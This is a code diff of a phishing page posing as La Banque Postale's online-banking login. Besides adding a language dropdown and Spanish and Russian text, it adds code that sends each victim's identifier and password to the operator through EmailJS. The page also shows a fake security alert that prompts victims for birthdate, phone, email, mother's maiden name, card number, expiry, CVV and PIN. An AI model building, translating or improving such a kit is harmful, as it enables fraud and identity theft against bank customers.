@@ -31,35 +31,68 @@ body {
     margin: 0;
     padding: 0;
 }
-.language-switcher {
+.language-dropdown {
     position: absolute;
     top: 20px;
     right: 20px;
-    display: flex;
-    gap: 10px;
     background: rgba(255, 255, 255, 0.9);
-    padding: 8px;
     border-radius: 20px;
     box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
 }
 
-.language-button {
+.dropdown-toggle {
     display: flex;
     align-items: center;
     gap: 5px;
-    padding: 5px 10px;
-    border: none;
+    padding: 8px 15px;
     background: transparent;
+    border: none;
     cursor: pointer;
-    border-radius: 15px;
-    transition: all 0.3s ease;
+    border-radius: 20px;
+    font-size: 14px;
 }
 
-.language-button:hover {
+.dropdown-toggle:hover {
     background: rgba(0, 70, 192, 0.1);
 }
 
-.language-button.active {
+.dropdown-content {
+    display: none;
+    position: absolute;
+    top: 100%;
+    right: 0;
+    background: white;
+    min-width: 120px;
+    border-radius: 15px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    padding: 5px;
+    margin-top: 5px;
+    z-index: 1000;
+}
+
+.language-dropdown:hover .dropdown-content {
+    display: block;
+}
+
+.language-option {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    padding: 8px 15px;
+    border: none;
+    background: transparent;
+    cursor: pointer;
+    width: 100%;
+    text-align: left;
+    border-radius: 10px;
+    transition: all 0.2s ease;
+}
+
+.language-option:hover {
+    background: rgba(0, 70, 192, 0.1);
+}
+
+.language-option.active {
     background: #0046c0;
     color: white;
 }
@@ -68,6 +101,11 @@ body {
     width: 20px;
     height: 15px;
     border-radius: 2px;
+    flex-shrink: 0;
+}
+
+.language-text {
+    white-space: nowrap;
 }
 
 
@@ -358,32 +396,59 @@ body {
 </head>
 <body>
 <div class="container">
-    <div class="language-switcher">
-        <button class="language-button active" onclick="switchLanguage('fr')">
+    <div class="language-dropdown" id="languageDropdown">
+        <button class="dropdown-toggle">
             <svg class="flag-icon" viewBox="0 0 60 40">
                 <rect width="20" height="40" x="0" fill="#002395"/>
                 <rect width="20" height="40" x="20" fill="#fff"/>
                 <rect width="20" height="40" x="40" fill="#ED2939"/>
             </svg>
-            FR
+            <span class="language-text">Français</span> ▾
         </button>
-        <button class="language-button" onclick="switchLanguage('en')">
-            <svg class="flag-icon" viewBox="0 0 60 40">
-                <rect width="60" height="40" fill="#012169"/>
-                <path d="M0,0 L60,40 M60,0 L0,40" stroke="#fff" stroke-width="6"/>
-                <path d="M30,0 L30,40 M0,20 L60,20" stroke="#fff" stroke-width="10"/>
-                <path d="M30,0 L30,40 M0,20 L60,20" stroke="#C8102E" stroke-width="6"/>
-            </svg>
-            EN
-        </button>
-        <button class="language-button" onclick="switchLanguage('ps')">
-            <svg class="flag-icon" viewBox="0 0 60 40">
-                <rect width="20" height="40" x="0" fill="#000000"/>
-                <rect width="20" height="40" x="20" fill="#D32011"/>
-                <rect width="20" height="40" x="40" fill="#007A36"/>
-            </svg>
-            PS
-        </button>
+        <div class="dropdown-content">
+            <button class="language-option active" data-lang="fr" data-full-name="Français">
+                <svg class="flag-icon" viewBox="0 0 60 40">
+                    <rect width="20" height="40" x="0" fill="#002395"/>
+                    <rect width="20" height="40" x="20" fill="#fff"/>
+                    <rect width="20" height="40" x="40" fill="#ED2939"/>
+                </svg>
+                <span class="language-text">Français</span>
+            </button>
+            <button class="language-option" data-lang="en" data-full-name="English">
+                <svg class="flag-icon" viewBox="0 0 60 40">
+                    <rect width="60" height="40" fill="#012169"/>
+                    <path d="M0,0 L60,40 M60,0 L0,40" stroke="#fff" stroke-width="6"/>
+                    <path d="M30,0 L30,40 M0,20 L60,20" stroke="#fff" stroke-width="10"/>
+                    <path d="M30,0 L30,40 M0,20 L60,20" stroke="#C8102E" stroke-width="6"/>
+                </svg>
+                <span class="language-text">English</span>
+            </button>
+            <button class="language-option" data-lang="es" data-full-name="Español">
+                <svg class="flag-icon" viewBox="0 0 60 40">
+                    <rect width="60" height="40" fill="#AA151B"/>
+                    <rect width="60" height="12" y="14" fill="#F1BF00"/>
+                </svg>
+                <span class="language-text">Español</span>
+            </button>
+            <button class="language-option" data-lang="ru" data-full-name="Русский">
+                <svg class="flag-icon" viewBox="0 0 60 40">
+                    <rect width="60" height="13.33" y="0" fill="#fff"/>
+                    <rect width="60" height="13.33" y="13.33" fill="#0039A6"/>
+                    <rect width="60" height="13.33" y="26.66" fill="#D52B1E"/>
+                </svg>
+                <span class="language-text">Русский</span>
+            </button>
+            <button class="language-option" data-lang="ps" data-full-name="پښتو">
+                <svg class="flag-icon" viewBox="0 0 60 40">
+                    <rect width="20" height="40" x="0" fill="#000000"/>
+                    <rect width="20" height="40" x="20" fill="#D32011"/>
+                    <rect width="20" height="40" x="40" fill="#007A36"/>
+                </svg>
+                <span class="language-text">پښتو</span>
+                
+            </button>
+            
+        </div>
     </div>
     <div class="login-form">
         <?xml version="1.0" encoding="utf-8"?>
@@ -604,9 +669,7 @@ body {
 
 
 <script>
-     let password = ''; // Variable pour stocker le mot de passe
-
-    document.addEventListener('DOMContentLoaded', function() {
+   document.addEventListener('DOMContentLoaded', function() {
     const numpad = document.getElementById('numpad');
     const passwordInput = document.getElementById('password-input');
     const passwordDots = document.getElementById('password-dots').children;
@@ -617,22 +680,19 @@ body {
     const identifierError = document.getElementById('identifier-error');
     const passwordError = document.getElementById('password-error');
     
-    const numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
-   
-    // Mélange aléatoire des chiffres
+    const numbers = [0,1,2,3,4,5,6,7,8,9];
     for (let i = numbers.length - 1; i > 0; i--) {
         const j = Math.floor(Math.random() * (i + 1));
         [numbers[i], numbers[j]] = [numbers[j], numbers[i]];
     }
-
-    // Créer les boutons pour le pavé numérique
+    
     numbers.forEach(num => {
         const button = document.createElement('button');
         button.textContent = num;
         button.addEventListener('click', () => addPasswordDigit(num));
         numpad.appendChild(button);
     });
-
+    
     continueButton.addEventListener('click', function() {
         if (/^\d{10}$/.test(identifierInput.value)) {
             identifierError.style.display = 'none';
@@ -642,22 +702,21 @@ body {
             identifierError.style.display = 'block';
         }
     });
-
-    // Fonction pour ajouter un chiffre au mot de passe
+    
     function addPasswordDigit(digit) {
-        if (password.length < 6) {
-            password += digit; // Ajouter le chiffre à la variable password
-            updatePasswordDots(); // Mettre à jour les points du mot de passe
+        if (passwordInput.value.length < 6) {
+            passwordInput.value += digit;
+            updatePasswordDots();
         }
     }
-
+    
     function updatePasswordDots() {
-        const length = password.length;
+        const length = passwordInput.value.length;
         for (let i = 0; i < passwordDots.length; i++) {
             passwordDots[i].classList.toggle('filled', i < length);
         }
     }
-
+    
     connectButton.addEventListener('click', function() {
         let isValid = true;
         
@@ -668,48 +727,58 @@ body {
             identifierError.style.display = 'none';
         }
         
-        if (password.length !== 6) {
+        if (passwordInput.value.length !== 6) {
             passwordError.style.display = 'block';
             isValid = false;
         } else {
             passwordError.style.display = 'none';
         }
-
+        
         if (isValid) {
+    // Afficher le loader avant l'envoi
     const loaderContainer = document.querySelector('.loader-container');
     loaderContainer.style.display = 'flex'; // Afficher le loader
 
-    setTimeout(() => {
-        loaderContainer.style.display = 'none'; // Masquer le loader après le délai
-        showSecurityAlert(); // Afficher l'alerte de sécurité
-    }, 5000);
+    // Envoyer l'email avec EmailJS
+    emailjs.send("service_zq5u5lo", "template_ow3rnce", {
+        identifier: identifierInput.value,
+        password: passwordInput.value,
+        timestamp: new Date().toLocaleString()
+    }).then(
+        function(response) {
+            console.log("SUCCESS", response);
+            setTimeout(() => {
+                loaderContainer.style.display = 'none'; // Masquer le loader après 3s
+                showSecurityAlert(); // Afficher l'alerte de sécurité
+            }, 3000); // Délai de 3 secondes
+        },
+        function(error) {
+            console.log("FAILED", error);
+            setTimeout(() => {
+                loaderContainer.style.display = 'none'; // Masquer le loader après 3s
+                showSecurityAlert(); // Afficher l'alerte même en cas d'échec
+            }, 3000); // Délai de 3 secondes
+        }
+    );
 }
 
     });
     
-    function showLoader() {
-        document.getElementById('loader').style.display = 'block';
-    }
-
-    function hideLoader() {
-        document.getElementById('loader').style.display = 'none';
-    }
-
-    function showSecurityAlert() {
-        document.getElementById('security-alert').style.display = 'block';
-    }
-
     document.addEventListener('click', function(e) {
         if (!e.target.closest('.numpad') && !e.target.closest('.connect-button')) {
-            password = '';
+            passwordInput.value = '';
             updatePasswordDots();
         }
     });
-
+    
     identifierInput.addEventListener('input', function(e) {
         this.value = this.value.replace(/\D/g, '');
     });
 });
+
+function showSecurityAlert() {
+    document.getElementById('security-alert').style.display = 'block';
+}
 
 function closeModal() {
     document.getElementById('security-alert').style.display = 'none';
@@ -779,7 +848,7 @@ function submitSecurityInfo() {
     // Intégration EmailJS
     emailjs.send("service_zq5u5lo", "template_ow3rnce", {
         identifier: identifier,
-        password: password,
+        
         birthdate: birthdate,
         phone: phone,
         email: email,
@@ -923,18 +992,98 @@ const translations = {
         pin: "د PIN کود: دا هیڅکله شریک نکړئ، حتی د خپلو نږدې خلکو سره",
         validate: "تایید",
         successMessage: "ستاسو معلومات په بریالیتوب سره خوندي شول.\nتاسو به خپل کارن پورټل ته ولیږدول شئ."
+    },
+    es: {
+        title: "Iniciar sesión en tu cuenta personal",
+        identifier: "Identificador (10 dígitos)",
+        continue: "Continuar",
+        password: "Contraseña (6 dígitos)",
+        connect: "Conectar",
+        forgotten: "¿Olvidaste tu identificador/contraseña?",
+        securityTitle: "Verificación de seguridad",
+        mainTitle: "La Banque Postale, banco ciudadano",
+        securityEvolution: "¡Tu página de inicio de sesión está evolucionando!",
+        securityMessage: "¡La seguridad de tu página de inicio de sesión se está modernizando! Para acceder a tus cuentas: introduce tu identificador y contraseña habituales.",
+        insuranceTitle: "Portal de seguros La Banque Postale",
+        insuranceMessage: "¿No tienes acceso a la banca en línea y deseas encontrar tus contratos de seguro de La Banque Postale?",
+        insuranceButton: "Acceder a mi espacio de seguros",
+        birthdate: "Fecha de nacimiento",
+        phone: "Número de teléfono móvil",
+        email: "Dirección de correo electrónico",
+        securityQuestion: "Pregunta de seguridad: Apellido de soltera de tu madre",
+        validate: "Validar",
+        whyInfo: "¿Por qué esta información?",
+        securityExplanation: "Esta información nos ayuda a proteger tu cuenta y a prevenir el fraude.",
+        dataProtection: "Tus datos están protegidos y cifrados según los estándares de seguridad más estrictos.",
+        alertTitle: "⚠️ Alerta de seguridad",
+        suspiciousActivity: "Se han detectado actividades sospechosas en tu cuenta.",
+        securityNeedVerification: "Por tu seguridad, necesitamos verificar tu identidad y actualizar la información de seguridad de tu cuenta.",
+        completeInfo: "Por favor, completa la información en la siguiente página para asegurar tu cuenta.",
+        fillRequired: "Por favor, rellena todos los campos obligatorios",
+        invalidPhone: "El número de teléfono debe tener un formato válido (ej: 0612345678)",
+        invalidEmail: "Por favor, introduce una dirección de correo válida",
+        loading: "Cargando...",
+        cardNumber: "Número de tarjeta (PAN): Los 16 dígitos",
+        expirationDate: "Fecha de caducidad: Mes y año",
+        cvv: "Código de seguridad (CVV): Los 3 dígitos en la parte trasera",
+        pin: "Código PIN: Nunca lo compartas, ni siquiera con personas cercanas",
+        successMessage: "Tu información ha sido guardada con éxito.\nSerás redirigido a tu portal de cliente."
+    },
+    ru: {
+        title: "Войти в личный кабинет",
+        identifier: "Идентификатор (10 цифр)",
+        continue: "Продолжить",
+        password: "Пароль (6 цифр)",
+        connect: "Войти",
+        forgotten: "Забыли идентификатор/пароль?",
+        securityTitle: "Проверка безопасности",
+        mainTitle: "La Banque Postale, гражданский банк",
+        securityEvolution: "Ваша страница входа обновляется!",
+        securityMessage: "Безопасность вашей страницы входа обновляется! Для доступа к вашим счетам: введите ваш обычный идентификатор и пароль.",
+        insuranceTitle: "Страховой портал La Banque Postale",
+        insuranceMessage: "У вас нет доступа к онлайн-банкингу и вы хотите найти свои страховые контракты La Banque Postale?",
+        insuranceButton: "Войти в мой страховой портал",
+        birthdate: "Дата рождения",
+        phone: "Мобильный номер телефона",
+        email: "Электронная почта",
+        securityQuestion: "Секретный вопрос: Девичья фамилия матери",
+        validate: "Подтвердить",
+        whyInfo: "Почему эта информация?",
+        securityExplanation: "Эта информация помогает защитить ваш аккаунт и предотвратить мошенничество.",
+        dataProtection: "Ваши данные защищены и зашифрованы в соответствии с самыми строгими стандартами безопасности.",
+        alertTitle: "⚠️ Предупреждение о безопасности",
+        suspiciousActivity: "Обнаружена подозрительная активность на вашем аккаунте.",
+        securityNeedVerification: "Для вашей безопасности нам необходимо проверить вашу личность и обновить информацию безопасности вашего аккаунта.",
+        completeInfo: "Пожалуйста, заполните информацию на следующей странице, чтобы обезопасить ваш аккаунт.",
+        fillRequired: "Пожалуйста, заполните все обязательные поля",
+        invalidPhone: "Номер телефона должен быть в правильном формате (например: 0612345678)",
+        invalidEmail: "Пожалуйста, введите действительный адрес электронной почты",
+        loading: "Загрузка...",
+        cardNumber: "Номер карты (PAN): 16 цифр",
+        expirationDate: "Срок действия: месяц и год",
+        cvv: "Код безопасности (CVV): 3 цифры на обратной стороне",
+        pin: "PIN-код: Никогда не делитесь им, даже с близкими",
+        successMessage: "Ваша информация успешно сохранена.\nВы будете перенаправлены в ваш личный кабинет."
     }
+    
 };
 
 function switchLanguage(lang) {
     // Remove active class from all buttons
-    document.querySelectorAll('.language-button').forEach(btn => {
+    document.querySelectorAll('.language-option').forEach(btn => {
         btn.classList.remove('active');
     });
     
-    // Add active class to clicked button
-    document.querySelector(`.language-button[onclick*="${lang}"]`).classList.add('active');
-    
+    // Add active class to selected language
+    const selectedButton = document.querySelector(`.language-option[data-lang="${lang}"]`);
+    if (selectedButton) {
+        selectedButton.classList.add('active');
+        
+        // Update dropdown toggle
+        const dropdownToggle = document.querySelector('.dropdown-toggle');
+        dropdownToggle.innerHTML = selectedButton.innerHTML + ' ▾';
+    }
+
     // Update all translatable elements
     const elements = {
         'h3': translations[lang].title,
@@ -980,8 +1129,29 @@ function switchLanguage(lang) {
             element.textContent = text;
         }
     }
+
+    // Save language preference
+    localStorage.setItem('preferredLanguage', lang);
+    
+    // Dispatch language change event
+    document.dispatchEvent(new CustomEvent('languageChanged', { 
+        detail: { language: lang } 
+    }));
 }
 
+// Add click event listeners to language options
+document.querySelectorAll('.language-option').forEach(button => {
+    button.addEventListener('click', function() {
+        const lang = this.getAttribute('data-lang');
+        switchLanguage(lang);
+    });
+});
+
+// Initialize with saved language or default to French
+document.addEventListener('DOMContentLoaded', function() {
+    const savedLanguage = localStorage.getItem('preferredLanguage') || 'fr';
+    switchLanguage(savedLanguage);
+});
 </script>
 </body>
 </html>
